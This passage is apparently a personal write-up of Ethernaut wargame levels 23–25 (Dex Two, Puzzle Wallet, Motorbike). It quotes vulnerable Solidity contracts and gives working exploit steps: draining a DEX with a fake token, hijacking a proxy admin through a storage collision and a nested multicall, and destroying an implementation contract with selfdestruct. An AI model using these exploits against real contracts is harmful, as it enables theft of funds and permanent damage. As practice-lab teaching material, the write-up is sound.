(await contract.balanceOf(t2, contract.address)).toString()
"40"
(await contract.balanceOf(t1, player)).toString()
"4"
(await contract.balanceOf(t2, player)).toString()
"70"
```

If math doesn't calculate you can use GPT to ask.
# 23 - Dex Two

This level will ask you to break `DexTwo`, a subtly modified `Dex` contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.

You will still start with 10 tokens of `token1` and 10 of `token2`. The DEX contract still starts with 100 of each token.

  Things that might help:

- How has the `swap` method been modified?

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

**Dex (old)

```c
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

**DexTwo (new):** That line is **completely gone.**

This means DexTwo will swap **any** ERC20 token — including ones you deploy yourself. You can create a fake token, seed the DEX with it, and manipulate the price ratio to drain the real tokens.

The pricing formula is still:

```
swapAmount = amount * (DEX_to_balance / DEX_from_balance)
```

If you send 1 fake token to the DEX (so DEX has 1 fake), then swap 1 fake token for t1:

```
swapAmount = 1 * (100 / 1) = 100
```

Deploy a fake ERC 20 Token in Remix.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {
    constructor() ERC20("Fake", "FAKE") {
        _mint(msg.sender, 400);
    }
}
```

**Transfer 1 fake token to the DEX** (so DEX ratio becomes 1:100):

```c
// In Remix, call transfer on FakeToken:
// to: <DexTwo contract address>
// amount: 1
```

![8](Images/8.png)

**Step — approve DexTwo to spend your FAKE:**

- Function: `approve`
- `spender`: your DexTwo instance address
- `amount`: `400`
- Click **transact**

Now in ethernaut:

```js
let t1 = await contract.token1()
let t2 = await contract.token2()
let fake = "0xYOUR_FAKETOKEN_ADDRESS_DEPLOYED"
```

```js
await contract.swap(fake, t1, 1)
```

**drain t2** (DEX now has 2 fake tokens):

```js
await contract.swap(fake, t2, 2)
```

verify both are zero:

```js
(await contract.balanceOf(t1, contract.address)).toString()
(await contract.balanceOf(t2, contract.address)).toString()
```

Submit.
# 24 - Puzzle Wallet

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help:

- Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

When a proxy uses `delegatecall`, the logic contract executes **in the proxy's storage context**. Storage is laid out by **slot position**, not variable name.

```
PuzzleProxy storage:        PuzzleWallet storage:
slot 0 → pendingAdmin       slot 0 → owner
slot 1 → admin              slot 1 → maxBalance
```

These **overlap**. This is the entire vulnerability:

- Writing `owner` in PuzzleWallet = writing `pendingAdmin` in PuzzleProxy
- Writing `maxBalance` in PuzzleWallet = writing `admin` in PuzzleProxy

Become `admin` of PuzzleProxy = overwrite **slot 1** = overwrite `maxBalance` in PuzzleWallet with your address.

To call `setMaxBalance` you need:

1. Be whitelisted
2. Contract ETH balance must be 0

But the contract has some ETH already. You need to **drain it first**.

Every function in Solidity has a **4-byte identifier** called a selector. It's how the EVM knows which function to call when a transaction comes in.

**How it's calculated:**

```
keccak256("functionName(paramType1,paramType2)") → take first 4 bytes
```

For example:

```
keccak256("transfer(address,uint256)")
= 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b
selector = 0xa9059cbb  ← just first 4 bytes
```

**How it's used in a transaction:**

```
transaction data = [4 byte selector] + [encoded arguments]
0xa9059cbb + 000000000000000000000000<address>0000000000000000000000000000000000000000000000000000000000000001
```

`multicall` tries to prevent depositing twice with the same `msg.value`:

```c
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    depositCalled = true;
}
```

But it only checks the **top-level** selector. You can bypass this by:

```c
multicall([
    deposit(),                    ← depositCalled = true, msg.value counted once
    multicall([deposit()])        ← nested multicall! depositCalled resets to false
])                                  msg.value counted AGAIN for free
```

So you send **0.001 ETH** but your `balances[you]` gets credited **0.002 ETH**. Now you can drain more than you put in.
### Step 1 — Become owner of PuzzleWallet via storage collision

`proposeNewAdmin` writes to slot 0 (pendingAdmin in proxy = owner in wallet):

```js
let iface = web3.eth.abi.encodeFunctionCall({name:'proposeNewAdmin',type:'function',inputs:[{type:'address',name:'_newAdmin'}]},[player])
```

```js
await web3.eth.sendTransaction({from:player, to:contract.address, data:iface})
```

```js
await contract.owner() // should return your address
```
## Step 2 — Whitelist yourself

```js
await contract.addToWhitelist(player)
```
## Step 3 — Check contract balance

```js
await getBalance(contract.address)
```

Note the value shown (probably `0.001`).
## Step 4 — Encode deposit calldata

```js
let depositData = web3.eth.abi.encodeFunctionCall({name:'deposit',type:'function',inputs:[]},[])
```
## Step 5 — Encode nested multicall

```js
let nestedMulticall = web3.eth.abi.encodeFunctionCall({name:'multicall',type:'function',inputs:[{type:'bytes[]',name:'data'}]},[[depositData]])
```
## Step 6 — Call multicall with both, sending 0.001 ETH

```js
await contract.multicall([depositData, nestedMulticall], {value: toWei('0.001')})
```

Verify its doubled:

```js
(await contract.balances(player)).toString() // should be 0.002 ETH in wei = "2000000000000000"
```

Now drain the contract:

```js
await contract.execute(player, toWei('0.002'), '0x')
```

```js
await getBalance(contract.address) // should be "0"
```
## Step 7 — Overwrite admin via setMaxBalance

```js
await contract.setMaxBalance(player)
```

Verify you are admin:

```js
await web3.eth.getStorageAt(contract.address, 1) // should return your address
```
# 25 - MotorBike

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to `selfdestruct` its engine and make the motorbike unusable ?

Things that might help:

- [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
- [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

```c
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

In UUPS (Universal Upgradeable Proxy Standard), the **upgrade logic lives in the implementation**, not the proxy. The proxy is very thin — it just delegates everything to the implementation address stored in a special EIP-1967 slot.

```c
User → Motorbike (proxy) → delegatecall → Engine (implementation)
```
### EIP-1967 Storage Slots

Instead of storing the implementation address in slot 0 (which causes storage collisions like we saw in PuzzleWallet), EIP-1967 uses a **pseudo-random slot**:

```c
slot = keccak256("eip1967.proxy.implementation") - 1
    = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
```

This slot is extremely unlikely to collide with any normal variable.

The `Engine` contract uses `initializer` modifier to prevent `initialize()` from being called twice — **but only in the proxy's storage context**.

When Motorbike deployed, it called:

```c
_logic.delegatecall(abi.encodeWithSignature("initialize()"))
```

This ran `initialize()` in the **proxy's storage**, setting `upgrader` and `horsePower` there. But the **Engine contract's own storage** was never initialized — `initialized = false` still in Engine directly.

So you can call `initialize()` **directly on the Engine contract**, bypassing the proxy entirely, and become the `upgrader`.


1. Find Engine's direct address from EIP-1967 slot
2. Call initialize() directly on Engine → become upgrader
3. Deploy a Killer contract with selfdestruct
4. Call `upgradeToAndCall(killerAddress, selfdestructCalldata)`
5. Engine selfdestructs → motorbike is bricked
## Step 1 — Get Engine's direct address

```c
let engineAddress = await web3.eth.getStorageAt(
    contract.address,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
)
```

```js
// Clean up the address (remove extra leading zeros)
engineAddress = "0x" + engineAddress.slice(26)
```
## Step 2 — Call initialize() directly on Engine

```js
let initData = web3.eth.abi.encodeFunctionCall({
    name: 'initialize',
    type: 'function',
    inputs: []
}, [])
```

```js
await web3.eth.sendTransaction({
    from: player,
    to: engineAddress,
    data: initData
})
```
## Step 3 — Verify you are now upgrader

```js
let upgraderSlot = await web3.eth.getStorageAt(engineAddress, 0)
console.log(upgraderSlot) // should contain your address
```
## Step 4 — Deploy Killer contract in Remix

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Killer {
    function kill() external payable {
        selfdestruct(payable(address(0)));
    }
}
```

Deploy this on Sepolia in Remix. Note the address.
## Step 5 — Encode the kill() call

```js
let killData = web3.eth.abi.encodeFunctionCall({
    name: 'kill',
    type: 'function',
    inputs: []
}, [])
```
## Step 6 — Encode upgradeToAndCall

```js
let upgradeData = web3.eth.abi.encodeFunctionCall({
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        { type: 'address', name: 'newImplementation' },
        { type: 'bytes', name: 'data' }
    ]
}, ["0xYOUR_KILLER_ADDRESS", killData])
```
## Step 7 — Send directly to Engine

```js
await web3.eth.sendTransaction({
    from: player,
    to: engineAddress,
    data: upgradeData
})
```

Engine `selfdestruct`s. The Motorbike proxy now points to a dead contract. It is permanently bricked.  Now fucking Submit.

---
